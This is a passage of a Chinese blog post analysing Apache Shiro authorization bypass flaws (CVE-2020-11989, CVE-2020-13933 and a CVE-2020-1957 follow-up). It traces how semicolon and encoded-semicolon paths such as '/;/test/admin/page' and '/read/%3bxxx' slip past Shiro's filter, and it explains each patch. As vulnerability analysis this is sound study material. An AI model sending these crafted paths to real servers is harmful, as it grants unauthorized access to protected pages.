<h3 id="0x03漏洞原理"><a href="#0x03漏洞原理" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>​        问题定位到getChain函数中对于requestURI的获取会调用getPathWithinApplication函数。如果输入**/fdsf;/../hello/1<strong>，getPathWithinApplication(request)获取的requestURI为</strong>/fdsf**，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
<p>​        getPathWithinApplication函数中会调用WebUtils (org.apache.shiro.web.util)中的getRequestUri函数获取RequestUri。</p>
<p>RequestUri函数中最终调用decodeAndCleanUriString函数对URI进行清洗。</p>
<p>​        如果URI中存在;号的话，则会删除其后面的所有字符。/fdsf;/../hello/1/最终也就变成了/fdsf。</p>
<p><strong>【关系链】</strong>：<strong>getChain函数（权限判定）</strong></p>
<p><strong>⟶ getPathWithinApplication函数（获取完整url：http://… /fdsf;/../hello/1）</strong></p>
<p>⟶ <strong>WebUtils的getRequestUri函数（获取RequestUri：/fdsf;/../hello/1）</strong></p>
<p>⟶ <strong>decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到/fdsf。</strong></p>
<p><strong>⟶ 绕过shiro拦截器。</strong></p>
<h3 id="0x04-POC-EXP-漏洞利用-1"><a href="#0x04-POC-EXP-漏洞利用-1" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        输入/fdsf;/../hello/1，getPathWithinApplication(request)获取的requestURI为/fdsf，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
<h3 id="0x05漏洞修复-1"><a href="#0x05漏洞修复-1" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        Shiro1.52。获取requestURI的方式从request.getRequestUri直接获取的方式更改为获取request的ContextPath，ServletPath，PathInfo，然后再重新拼接而成。输入的/fdsf;/../hello/1/，将会被拼接为//hello/1/再进行URI路径匹配，则无法绕过拦截器。</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183906465.png" alt="image-20230813183906465"></p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183920110.png" alt="image-20230813183920110"></p>
<p>【<strong>知识补充</strong>】</p>
<p>例如：<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1%EF%BC%8C%E5%85%B6%E4%B8%ADrooturl%E6%98%AF%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95">http://127.0.0.1:8080/a/rooturl/b/test?c=1，其中rooturl是项目的根目录</a></p>
<ul>
<li><p> getServletPath()：获取能够与“url-pattern”中匹配的路径，注意是完全匹配的部分，*的部分不包括。                                                          # b/test</p>
</li>
<li><p>getPageInfo()：与getServletPath()获取的路径互补，能够得到的是“url-pattern”中*d的路径部分                                                                     #c=1</p>
</li>
<li><p>getContextPath()：获取项目的根路径                                # /a/rooturl</p>
</li>
<li><p>getRequestURI()：获取根路径到地址结尾                        #/a/rooturl/b/test?c=1</p>
</li>
<li><p>getRequestURL()：获取请求的地址链接（输入的地址）#<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1">http://127.0.0.1:8080/a/rooturl/b/test?c=1</a></p>
</li>
<li><p>getServletContext().getRealPath(“/”)：获取“/”在机器中的实际地址</p>
</li>
<li><p>getServerName():获取的是域名(xxx.com)</p>
</li>
</ul>
<h2 id="Apache-Shiro权限绕过漏洞分析-CVE-2020-11989"><a href="#Apache-Shiro权限绕过漏洞分析-CVE-2020-11989" class="headerlink" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)"></a>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</h2><h3 id="0x01-漏洞介绍-4"><a href="#0x01-漏洞介绍-4" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        总结来说就是当URL进入到Tomcat时，Tomcat判断**/;test/admin/page** 为test应用下的**/admin/page**路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。</p>
<h3 id="0x02-漏洞环境-测绘指纹-4"><a href="#0x02-漏洞环境-测绘指纹-4" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
<li><p>Apache Shiro &lt; 1.5.3</p>
</li>
<li><p>Spring 框架中只使用 Shiro 鉴权</p>
</li>
<li><p>应用不能部署在根目录，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，即Shiro获取的url与Web框架处理url不一致的情况就能造成权限绕过。若Shiro版本小于1.5.2的话那么该条件就不需要，因为1.5.2版本前，requestURI是直接获取方式，而不是通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到。</p>
</li>
</ul>
<h3 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h3><p>以输入<font color="red">/;/test/admin/page</font>为例, 若<font color="red">admin/page</font>是授权访问目录,<font color="red">/;/test</font> 是根目录：</p>
<ul>
<li><p>由（CVE-2020-2957）修补方式可知；requestURI的获取方式为通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到，获取到的requestURI为/;/test//admin/page。</p>
</li>
<li><p>然后传入decodeAndCleanUriString，根据“；”进行URL截断，所以最终返回了/，传入后decodeAndCleanUriString变成了/。</p>
</li>
</ul>
<p>（由于“/”不是禁止访问目录，所以可以绕过shiro鉴权拦截器）</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184309614.png" alt="image-20230813184309614"></p>
<p><strong>contextPath</strong>:/;/test,     应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test;</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184327784.png" alt="image-20230813184327784"></p>
<p>getRequestUri 获取到的是:”/”</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184344695.png" alt="image-20230813184344695"></p>
<p>decodeAndCleanUriString():/</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184353276.png" alt="image-20230813184353276"></p>
<ul>
<li><p><strong>/;/test//admin/page</strong>传入spring控制器（此版本没有权限校验），由getPathWithinServletMapping()格式化处理后，最后返回**/admin/page**，成功访问未授权目录。</p>
<p>contextPath:/;/test</p>
<p>PathwithinApp：/test/admin/page</p>
<p>ServeletPath：/admin/page</p>
</li>
</ul>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184437756.png" alt="image-20230813184437756"></p>
<p>【<strong>关系链</strong>】</p>
<ul>
<li> <strong>Shiro鉴权器</strong></li>
</ul>
<p><strong>getChain函数（权限判定）</strong></p>
<p><strong>⟶ getPathWithinApplication函数（获取完整url：<font color="red">http://… /;/test/admin/page</font>）</strong></p>
<p><strong>⟶ getRequestUri函数（获取RequestUri：<font color="red">/;/test//admin/page</font>）</strong></p>
<p><strong>⟶ decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到<font color="red">/</font></strong></p>
<p>⟶ <strong>绕过shiro鉴权器</strong></p>
<ul>
<li><strong>spring控制器</strong></li>
</ul>
<p><strong>RequestUri（ <font color="red">/;/test//admin/page</font>）传入 spring控制器</strong></p>
<p><strong>⟶ getPathWithinServletMapping()</strong></p>
<p><strong>⟶ServeletPath：<font color="red">/admin/page</font></strong></p>
<p><strong>⟶访问/admin/page</strong></p>
<h3 id="0x04-POC-EXP-漏洞利用-2"><a href="#0x04-POC-EXP-漏洞利用-2" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        只要根据漏洞环境去构造payload地址即可。例如如果直接访问 /test/admin/page，会返回302跳转要求登录，访问 /;/test/admin/page, 就能直接绕过Shiro权限验证，访问到/admin路由中的信息</p>
<h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h3><p>​        Shiro 1.5.3修改了URL获取的逻辑，不单独处理context-path，（单独处理时可以在判断context-path时进行绕过）<br> org.apache.shiro.web.util.WebUtils#getPathWithinApplication</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185051542.png" alt="image-20230813185051542"></p>
<p>因此就无法再通过构造context-path的方式来进行绕过了。</p>
<h2 id="Apache-Shiro-权限绕过漏洞（CVE-2020-13933）"><a href="#Apache-Shiro-权限绕过漏洞（CVE-2020-13933）" class="headerlink" title="Apache Shiro 权限绕过漏洞（CVE-2020-13933）"></a>Apache Shiro 权限绕过漏洞（CVE-2020-13933）</h2><h3 id="0x01-漏洞介绍-5"><a href="#0x01-漏洞介绍-5" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        Apache Shiro的CVE-2020-11989修补补丁依旧存在缺陷，由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/read/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证。</p>
<h3 id="0x02-漏洞环境-测绘指纹-5"><a href="#0x02-漏洞环境-测绘指纹-5" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
<li>Apache Shiro &lt; 1.6.0</li>
<li> Spring 框架中只使用 Shiro 鉴权</li>
</ul>
<h3 id="0x03漏洞原理-1"><a href="#0x03漏洞原理-1" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>【<strong>key</strong>】shiro和spring在处理url中仍然存在差别</p>
<p>假设条件：**/admin/{name}<strong>是授权访问目录（</strong>/admin**不需要授权访问）</p>
<p>【<strong>shiro处理URI</strong>】</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185238889.png" alt="image-20230813185238889"></p>
<p>若输入：**/admin/%3bpage**</p>
<p>传入/admin/%3bpage 解码后为**/admin/;bpage** ，传入removeSenicolon（）</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185337503.png" alt="image-20230813185337503"></p>
<p>removeSenicolon()根据“；”分隔符进行截取，返回**/admin/**到requestURI。</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185354022.png" alt="image-20230813185354022"></p>
<p>此处因为/admin/没有匹配到具体资源路径（不需要授权访问），所以通过过滤器到达Spring的处理逻辑。</p>
<p>【<strong>spring处理URI</strong>】</p>
<p>​        注意这里Spring的处理逻辑为先去判断URI中是否存在“；”等特殊字符，如果存在就先处理（删除）再匹配路径。（没有先编码再判断是否存在特殊符号）</p>
<p>getPathWithinApplication()传入getRequestUrl的是<font color="red">/admin/%3bpage</font> <img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185455706.png" alt="image-20230813185455706"></p>
<p>DecodeAndCleanUriString()清洗数据的时候，removeSemicolonContentInternal()清洗模块没有进行编码“%3b”，即没有发现“；”，所以返回结果是**/admin/%3bpage<strong>。然后到decodeRequestString()进行解码得到</strong>/admin/;page**.</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185548331.png" alt="image-20230813185548331"></p>
<p>removeSemicolonContentInternal()执行细节</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185555497.png" alt="image-20230813185555497"></p>
<p><strong>/admin/;page</strong>之后进行匹配为**/admin/page**，从而获取相应资源。</p>
<h3 id="0x04-POC-EXP-漏洞利用-3"><a href="#0x04-POC-EXP-漏洞利用-3" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/admin/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证，直接访问/read/xxx。</p>
<h3 id="0x05-漏洞修补"><a href="#0x05-漏洞修补" class="headerlink" title="0x05 漏洞修补"></a>0x05 漏洞修补</h3><p>​        添加一个一个InvalidRequestFilter类，该类从全局上对分号，反斜杠和非ASCII字符进行了过滤。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/emgexgb_sef/article/details/123863818">https://blog.csdn.net/emgexgb_sef/article/details/123863818</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">85</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<!-- 页面动态背景 -->

<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>